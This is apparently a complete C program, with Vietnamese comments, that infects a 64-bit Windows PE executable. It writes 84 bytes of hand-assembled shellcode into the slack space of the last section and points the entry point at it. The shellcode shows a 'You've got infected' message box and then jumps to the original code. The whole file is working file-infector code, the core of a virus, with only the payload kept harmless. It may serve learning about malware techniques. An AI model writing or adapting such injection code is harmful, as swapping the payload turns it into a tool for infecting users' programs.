#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define PAYLOAD_SIZE 84   // 58 bytes mã lệnh + 6 bytes cho "Alert\0" + 20 bytes cho "You've got infected\0"

int main(int argc, char* argv[])
{
    if(argc != 2)
    {
        printf("Usage: %s <target.exe>\n", argv[0]);
        return 1;
    }

    // Mở file PE mục tiêu với quyền READ/WRITE.
    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
    {
        printf("Lỗi mở file %s\n", argv[1]);
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if(fileSize == INVALID_FILE_SIZE)
    {
        printf("Lỗi lấy kích thước file.\n");
        CloseHandle(hFile);
        return 1;
    }

    // Tạo file mapping và map file vào bộ nhớ.
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, fileSize, NULL);
    if(!hMapping)
    {
        printf("Lỗi tạo file mapping.\n");
        CloseHandle(hFile);
        return 1;
    }

    LPVOID pFile = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if(!pFile)
    {
        printf("Lỗi map view của file.\n");
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    // Kiểm tra DOS header.
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFile;
    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("File không hợp lệ (DOS header không đúng).\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    // Dùng NT Headers 64-bit.
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)pFile + pDosHeader->e_lfanew);
    if(pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("File không hợp lệ (NT header không đúng).\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    // Lấy số section và con trỏ đến section cuối cùng.
    WORD nSections = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    PIMAGE_SECTION_HEADER pLastSection = &pSectionHeader[nSections - 1];

    // Tính không gian thừa (slack space) của section cuối:
    // slackSpace = SizeOfRawData - VirtualSize hiện tại.
    DWORD slackSpace = pLastSection->SizeOfRawData - pLastSection->Misc.VirtualSize;
    if(slackSpace < PAYLOAD_SIZE)
    {
        printf("Không đủ không gian trống trong section cuối để tiêm code.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    // Xác định vị trí injection:
    // - injectionOffset: vị trí (offset) trong file = PointerToRawData + VirtualSize hiện tại của section cuối.
    // - injectionRVA: địa chỉ ảo (RVA) = VirtualAddress của section cuối + VirtualSize hiện tại.
    DWORD injectionOffset = pLastSection->PointerToRawData + pLastSection->Misc.VirtualSize;
    DWORD injectionRVA    = pLastSection->VirtualAddress   + pLastSection->Misc.VirtualSize;

    // Lưu lại AddressOfEntryPoint ban đầu (tính dưới dạng địa chỉ tuyệt đối khi load).a
    uint64_t imageBase = pNtHeaders->OptionalHeader.ImageBase;
    uint64_t originalEntryAddr = imageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    // Lấy địa chỉ hàm MessageBoxA từ user32.dll.
    // HMODULE hUser32 = GetModuleHandleA("user32.dll");
    HMODULE hUser32 = LoadLibraryA("user32.dll");

    if(!hUser32)
    {
        printf("Không thể lấy handle của user32.dll.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if(!pMessageBoxA)
    {
        printf("Không thể lấy địa chỉ của MessageBoxA.\n");
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }
    uint64_t msgBoxAddr = (uint64_t)pMessageBoxA;

    // Xây dựng payload (84 bytes):
    // Cấu trúc payload:
    // [0 - 3]:    sub rsp, 0x20
    // [4 - 6]:    xor rcx, rcx            ; hWnd = NULL
    // [7 - 16]:   mov rdx, <addr_text>      ; &text (absolute address = ImageBase + injectionRVA + 64)
    // [17 - 26]:  mov r8, <addr_caption>     ; &caption (absolute address = ImageBase + injectionRVA + 58)
    // [27 - 29]:  xor r9, r9              ; uType = 0 (MB_OK)
    // [30 - 39]:  mov rax, <msgBoxAddr>
    // [40 - 41]:  call rax
    // [42 - 45]:  add rsp, 0x20
    // [46 - 55]:  mov rax, <originalEntryAddr>
    // [56 - 57]:  jmp rax
    // [58 - 63]:  chuỗi "Alert\0" (6 bytes)
    // [64 - 83]:  chuỗi "You've got infected\0" (20 bytes)
    BYTE payload[PAYLOAD_SIZE] = {0};
    int offset = 0;

    // sub rsp, 0x20  (4 bytes)
    payload[offset++] = 0x48;
    payload[offset++] = 0x83;
    payload[offset++] = 0xEC;
    payload[offset++] = 0x20;

    // xor rcx, rcx  (3 bytes)
    payload[offset++] = 0x48;
    payload[offset++] = 0x31;
    payload[offset++] = 0xC9;

    // mov rdx, <addr_text>  (10 bytes)
    payload[offset++] = 0x48;
    payload[offset++] = 0xBA;
    uint64_t addr_text = imageBase + injectionRVA + 64; // địa chỉ tuyệt đối của chuỗi thông điệp
    memcpy(payload + offset, &addr_text, sizeof(uint64_t));
    offset += 8;

    // mov r8, <addr_caption>  (10 bytes)
    payload[offset++] = 0x49;
    payload[offset++] = 0xB8;
    uint64_t addr_caption = imageBase + injectionRVA + 58; // địa chỉ tuyệt đối của chuỗi caption
    memcpy(payload + offset, &addr_caption, sizeof(uint64_t));
    offset += 8;

    // xor r9, r9  (3 bytes)
    payload[offset++] = 0x45;
    payload[offset++] = 0x31;
    payload[offset++] = 0xC9;

    // mov rax, <msgBoxAddr>  (10 bytes)
    payload[offset++] = 0x48;
    payload[offset++] = 0xB8;
    memcpy(payload + offset, &msgBoxAddr, sizeof(uint64_t));
    offset += 8;

    // call rax  (2 bytes)
    payload[offset++] = 0xFF;
    payload[offset++] = 0xD0;

    // add rsp, 0x20  (4 bytes)
    payload[offset++] = 0x48;
    payload[offset++] = 0x83;
    payload[offset++] = 0xC4;
    payload[offset++] = 0x20;

    // mov rax, <originalEntryAddr>  (10 bytes)
    payload[offset++] = 0x48;
    payload[offset++] = 0xB8;
    memcpy(payload + offset, &originalEntryAddr, sizeof(uint64_t));
    offset += 8;

    // jmp rax  (2 bytes)
    payload[offset++] = 0xFF;
    payload[offset++] = 0xE0;

    // Hiện tại, offset = 58 bytes. Tiếp theo là đính kèm chuỗi:
    // Chuỗi caption "Alert\0" tại offset 58 (6 bytes)
    const char* captionStr = "Alert";
    memcpy(payload + offset, captionStr, strlen(captionStr) + 1);
    offset += (int)(strlen(captionStr) + 1);
    // Chuỗi thông điệp "You've got infected\0" tại offset 64 (20 bytes)
    const char* textStr = "You've got infected";
    memcpy(payload + offset, textStr, strlen(textStr) + 1);
    offset += (int)(strlen(textStr) + 1);

    if(offset != PAYLOAD_SIZE)
    {
        printf("Kích thước payload không khớp: mong đợi %d, nhận được %d\n", PAYLOAD_SIZE, offset);
        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 1;
    }

    // Chép payload vào file mapping tại vị trí injectionOffset.
    memcpy((BYTE*)pFile + injectionOffset, payload, PAYLOAD_SIZE);

    // Cập nhật VirtualSize của section cuối để bao gồm payload mới.
    pLastSection->Misc.VirtualSize += PAYLOAD_SIZE;

    // Nếu cần, cập nhật SizeOfImage.
    DWORD newImageSize = pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize;
    if(newImageSize > pNtHeaders->OptionalHeader.SizeOfImage)
         pNtHeaders->OptionalHeader.SizeOfImage = newImageSize;

    // Thay đổi AddressOfEntryPoint để trỏ vào payload.
    pNtHeaders->OptionalHeader.AddressOfEntryPoint = injectionRVA;

    // Giải phóng mapping và đóng các handle.
    UnmapViewOfFile(pFile);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    printf("Injection thành công. Payload đã được chèn vào section cuối.\n");
    return 0;
}
